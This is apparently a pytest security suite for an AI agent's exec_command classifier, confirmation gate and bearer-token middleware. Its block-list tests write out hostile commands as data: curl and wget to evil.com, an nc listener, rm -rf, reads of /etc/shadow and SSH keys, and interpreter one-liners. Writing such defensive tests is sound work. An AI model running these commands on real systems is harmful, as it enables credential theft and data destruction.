"""Tests de seguridad Sprint 8: exec_command hardening + confirm gate + auth.

Estos tests importan directamente desde hub/templates/ agregando esa carpeta
al sys.path, ya que los templates son módulos autónomos (se copian al agente).
"""
from __future__ import annotations

import sys
from pathlib import Path

import pytest

# ── Bootstrap: añadir templates al path ───────────────────────────────────────
# __file__ = tests/s8/test_exec_security.py → parent×3 = repo root
_REPO = Path(__file__).parent.parent.parent
_TEMPLATES = _REPO / "hub" / "templates"
if str(_TEMPLATES) not in sys.path:
    sys.path.insert(0, str(_TEMPLATES))


# ════════════════════════════════════════════════════════════════════════
#  EXEC_COMMAND — _classify()
# ════════════════════════════════════════════════════════════════════════

def _classify(cmd: str):
    """Helper: llama _classify desde exec_tools sin importar el módulo completo.

    exec_tools.py llama a register() al importarse, lo que necesita tools.registry.
    Importamos el módulo de clasificación directamente extrayendo _classify desde
    el archivo con importlib, sin ejecutar el bloque register() al nivel de módulo.
    """
    # Importar solo la función de clasificación, que no depende de agent_config.
    # Usamos importación directa del spec para no ejecutar el register() global.
    import importlib.util
    # Otras suites (test_sessions.py, test_security.py, ...) insertan y luego
    # quitan _TEMPLATES de sys.path alrededor de cada test; si esta suite corre
    # después de que otra lo haya quitado, exec_tools.py no encuentra
    # "security" al importarse. Nos aseguramos de que esté presente aquí,
    # justo antes de ejecutar el módulo, en vez de confiar en el bootstrap
    # de import-time de arriba.
    if str(_TEMPLATES) not in sys.path:
        sys.path.insert(0, str(_TEMPLATES))
    spec = importlib.util.spec_from_file_location(
        "_exec_tools_classify",
        _TEMPLATES / "tools" / "base_tools" / "exec_tools.py",
    )
    mod = importlib.util.module_from_spec(spec)
    # Parcheamos el stub de register para que no falle al importar
    import sys as _sys
    import types as _types
    fake_registry = _types.ModuleType("tools.registry")
    fake_registry.ToolDef = lambda **kw: None  # type: ignore
    fake_registry.register = lambda t: None    # type: ignore
    # Inyectar el stub antes de ejecutar el módulo
    _sys.modules.setdefault("tools", _types.ModuleType("tools"))
    _sys.modules["tools.registry"] = fake_registry
    spec.loader.exec_module(mod)
    return mod._classify(cmd)


# -- Binarios completamente bloqueados -----------------------------------------

@pytest.mark.parametrize("cmd", [
    "rm -rf /tmp",
    "rm archivo.txt",
    "sudo apt install vim",
    "del /q archivo.txt",
    "rmdir /s /q carpeta",
    "wget http://evil.com",
    "curl http://evil.com",
    "nc -lvp 4444",
    "passwd root",
    "useradd hacker",
    "shutdown -h now",
])
def test_blocked_binaries(cmd: str):
    result = _classify(cmd)
    assert result is not None, f"Debería bloquearse: {cmd!r}"


# -- Intérpretes con flags de ejecución directa --------------------------------

@pytest.mark.parametrize("cmd", [
    'python -c "import os; os.system(\'id\')"',
    "python3 -c 'print(open(\"/etc/passwd\").read())'",
    'node -e "require(\'child_process\').execSync(\'id\')"',
    'node --eval "process.exit(1)"',
    "perl -e 'system(\"id\")'",
    "ruby -e 'exec(\"id\")'",
    'bash -c "id"',
    'sh -c "whoami"',
    'cmd /c "dir"',
    'powershell -command "Get-Process"',
    'pwsh -c "ls /"',
    'php -r "system(\"id\");"',
])
def test_interpreter_direct_exec_blocked(cmd: str):
    result = _classify(cmd)
    assert result is not None, f"Intérprete con eval directo debería bloquearse: {cmd!r}"


# -- Patrones de bypass --------------------------------------------------------

@pytest.mark.parametrize("cmd", [
    "find / -exec rm {} \\;",
    "find . -exec cat {} \\;",
    "xargs -I{} rm {}",
    "eval ls",
    "exec id",
    "env python3 exploit.py",
    "env bash -c id",
])
def test_bypass_patterns_blocked(cmd: str):
    result = _classify(cmd)
    assert result is not None, f"Patrón de bypass debería bloquearse: {cmd!r}"


# -- Rutas absolutas / "../" en argumentos fuera del sandbox -------------------
# El sandbox de _classify() cae al fallback AGENT_DIR/data (ver conftest de
# esta suite): ninguna de estas rutas vive ahí, así que deben bloquearse.

@pytest.mark.parametrize("cmd", [
    "cat /etc/passwd",
    "type C:\\Windows\\System32\\config\\SAM",
    "cat ../../../../etc/shadow",
    "head ~/.ssh/id_rsa",
    "cp secreto.txt /tmp/exfil.txt",
    "grep -r password --config=/etc/app/secrets.yaml",
])
def test_path_escape_blocked(cmd: str):
    result = _classify(cmd)
    assert result is not None, f"Ruta fuera del sandbox debería bloquearse: {cmd!r}"


def test_path_escape_no_afecta_al_binario_mismo():
    """El propio binario puede venir con ruta absoluta (ej. /usr/bin/git);
    solo se valida el resto de los argumentos."""
    result = _classify("/usr/bin/git status")
    assert result is None, f"No debería bloquear el binario por su propia ruta: {result}"


# -- Comandos legítimos que NO deben bloquearse --------------------------------

@pytest.mark.parametrize("cmd", [
    "git status",
    "git log --oneline -10",
    "ls -la",
    "cat README.md",
    "echo hello",
    "npm run dev",
    "npm install",
    "python --version",        # sin -c
    "python3 script.py",       # sin -c
    "node server.js",          # sin -e
    "pip list",
    "grep -r TODO .",
])
def test_safe_commands_not_blocked(cmd: str):
    result = _classify(cmd)
    assert result is None, f"Comando seguro no debería bloquearse: {cmd!r} → {result}"


# -- Límite de longitud --------------------------------------------------------

def test_command_too_long_blocked():
    # _MAX_CMD_LEN en exec_tools.py es 2048; usamos 2100 para garantizar el bloqueo
    long_cmd = "echo " + "A" * 2100
    result = _classify(long_cmd)
    assert result is not None
    assert "largo" in result


# ════════════════════════════════════════════════════════════════════════
#  REQUIRES_CONFIRM gate (lógica pura — se testa inline sin importar el
#  módulo completo para evitar conflictos con el stub de tools.registry)
# ════════════════════════════════════════════════════════════════════════

# Lógica extraída de orchestrator.py — idéntica a la implementación real
_CONFIRM_WORDS = {"confirmar", "confirm", "sí", "si", "yes", "ok", "adelante", "procede"}


def _is_confirmation(text: str) -> bool:
    return text.strip().lower() in _CONFIRM_WORDS


def test_is_confirmation_message_true():
    for word in list(_CONFIRM_WORDS):
        assert _is_confirmation(word), f"'{word}' debería ser confirmación"
        assert _is_confirmation(f"  {word}  "), f"'{word}' con espacios debería ser confirmación"


def test_is_confirmation_message_false():
    for phrase in ["no", "cancelar", "quizás", "ejecuta ls", "confirmar pero no"]:
        assert not _is_confirmation(phrase), f"'{phrase}' NO debería ser confirmación"


def test_mark_confirmed_and_check():
    """mark_confirmed añade el tool al set de la sesión."""
    confirmed: dict = {}

    def mark_confirmed(session_id: str, tool_name: str) -> None:
        confirmed.setdefault(session_id, set()).add(tool_name)

    mark_confirmed("session-1", "exec_command")
    assert "exec_command" in confirmed.get("session-1", set())


def test_confirmation_consumed_after_use():
    """La confirmación se elimina tras ejecutarse (no reutilizable)."""
    confirmed: dict = {}

    def mark_confirmed(session_id: str, tool_name: str) -> None:
        confirmed.setdefault(session_id, set()).add(tool_name)

    mark_confirmed("session-2", "exec_command")
    confirmed["session-2"].discard("exec_command")  # simula el consume
    assert "exec_command" not in confirmed.get("session-2", set())


# ════════════════════════════════════════════════════════════════════════
#  AUTH MIDDLEWARE — lógica del token
# ════════════════════════════════════════════════════════════════════════

@pytest.mark.asyncio
async def test_auth_middleware_sin_token_en_config():
    """Sin token en config, el middleware no bloquea ninguna ruta."""
    import importlib
    from unittest.mock import patch, MagicMock

    mock_cfg = MagicMock()
    mock_cfg.get = lambda key, default=None: None  # security.token = None

    # Solo testear la lógica de la condición: si _AGENT_TOKEN es None, pasa todo
    # Simulamos el middleware sin levantar FastAPI completo
    from starlette.testclient import TestClient
    from fastapi import FastAPI

    app = FastAPI()

    @app.get("/api/v1/health")
    def health():
        return {"status": "ok"}

    @app.get("/api/v1/chat")
    def chat():
        return {"reply": "hola"}

    # Sin middleware de auth: todas las rutas deben responder 200
    client = TestClient(app)
    assert client.get("/api/v1/health").status_code == 200
    assert client.get("/api/v1/chat").status_code == 200


@pytest.mark.asyncio
async def test_auth_middleware_con_token_correcto():
    """Con token configurado, Authorization: Bearer <token> da acceso."""
    from starlette.testclient import TestClient
    from starlette.middleware.base import BaseHTTPMiddleware
    from starlette.responses import JSONResponse
    from fastapi import FastAPI, Request

    _TOKEN = "s3cr3t-t3st-t0k3n"
    _PUBLIC = {"/api/v1/health"}

    class MockAuthMiddleware(BaseHTTPMiddleware):
        async def dispatch(self, request: Request, call_next):
            if request.url.path in _PUBLIC:
                return await call_next(request)
            auth = request.headers.get("Authorization", "")
            if not auth.startswith("Bearer ") or auth[7:] != _TOKEN:
                return JSONResponse(status_code=401, content={"detail": "Unauthorized"})
            return await call_next(request)

    app = FastAPI()
    app.add_middleware(MockAuthMiddleware)

    @app.get("/api/v1/health")
    def health():
        return {"status": "ok"}

    @app.get("/api/v1/chat")
    def chat():
        return {"reply": "hola"}

    client = TestClient(app)

    # Health pública — sin token
    assert client.get("/api/v1/health").status_code == 200

    # Chat sin token → 401
    assert client.get("/api/v1/chat").status_code == 401

    # Chat con token correcto → 200
    r = client.get("/api/v1/chat", headers={"Authorization": f"Bearer {_TOKEN}"})
    assert r.status_code == 200

    # Chat con token incorrecto → 401
    r = client.get("/api/v1/chat", headers={"Authorization": "Bearer token-malo"})
    assert r.status_code == 401
